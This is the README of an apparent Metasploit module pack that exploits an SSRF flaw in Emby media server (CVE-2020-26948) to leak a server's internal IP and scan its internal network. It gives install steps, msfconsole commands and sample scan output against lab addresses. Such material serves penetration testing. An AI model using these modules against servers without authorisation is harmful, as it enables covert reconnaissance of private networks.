# msf_emby

This tool will check a remote EMBY server to attempt to use an SSRF vulnerability to perform an http scan of the network internal to the EMBY server. This is based on the vulnerability CVE-2020-26948.

## Installation
Clone the repo and put the rb files into the `/usr/share/metasploit-framework/modules/auxiliary/scanner/http/` directory. Run msfconsole, and use the modules from there.

## Help
### Emby_Version:

  1. Do: `use auxiliary/scanner/http/emby_version_ssrf`
  2. Do: `set rhosts [ips]`
  3. Do: `run`

```
msf6 > use auxiliary/scanner/http/emby_version_ssrf
msf6 auxiliary(scanner/http/emby_version_ssrf) > set rhosts 10.10.200.32
rhosts => 10.10.200.32
msf6 auxiliary(scanner/http/emby_version_ssrf) > run

[*] Identifying Media Server Version on 10.10.200.32:8096
[+] [Media Server] URI: http://10.10.200.32:8096  /
[+] [Media Server] Version: 4.4.2.0
[+] [Media Server] Internal IP: http://192.168.2.3:8096
[+] *** Vulnerable to SSRF module auxiliary/scanner/emby_ssrf_scanner! ***
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Emby_Scan:

  1. Do: `use auxiliary/scanner/http/emby_ssrf_scanner`
  2. Do: `set rhosts [ips]`
  3. Do: `set emby_server [emby_server_ip]`
  4. Do: `run`

```
msf6 > use auxiliary/scanner/http/emby_ssrf_scanner
msf6 auxiliary(scanner/http/emby_ssrf_scanner) > set emby_server 10.10.200.32
emby_server => 10.10.200.32
msf6 auxiliary(scanner/http/emby_ssrf_scanner) > set rhosts 192.168.2.3
rhosts => 192.168.2.3
msf6 auxiliary(scanner/http/emby_ssrf_scanner) > run

[+] 192.168.2.3:8096 Title: Emby
[+] 192.168.2.3:8096     HTTP Code: 200
[+] 192.168.2.3:8096     Location Header:
[+] 192.168.2.3:8096     Server Header: UPnP/1.0 DLNADOC/1.50
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
